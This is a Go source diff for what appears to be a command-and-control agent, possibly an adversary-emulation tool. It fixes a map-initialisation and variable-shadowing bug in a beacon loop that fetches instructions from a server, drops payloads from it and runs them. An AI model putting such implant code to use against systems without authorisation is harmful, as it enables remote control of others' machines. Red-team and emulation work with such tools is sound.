@@ -23,7 +23,7 @@ import (
 
 func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	for {
-	    var payload_location_map map[string]string
+	    payload_location_map := make(map[string]string)
 		beacon := coms.GetInstructions(profile)
 		if beacon["sleep"] != nil {
 			profile["sleep"] = beacon["sleep"]
@@ -34,7 +34,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 				cmd := cmds.Index(i).Elem().String()
 				command := util.Unpack([]byte(cmd))
 				fmt.Printf("[*] Running instruction %s\n", command["id"])
-				payloads, payload_location_map := coms.DropPayloads(command["payload"].(string), profile["server"].(string), payload_location_map)
+				payloads := coms.DropPayloads(command["payload"].(string), profile["server"].(string), payload_location_map)
 				go coms.RunInstruction(command, profile, payloads)
 				util.Sleep(command["sleep"].(float64))
 			}
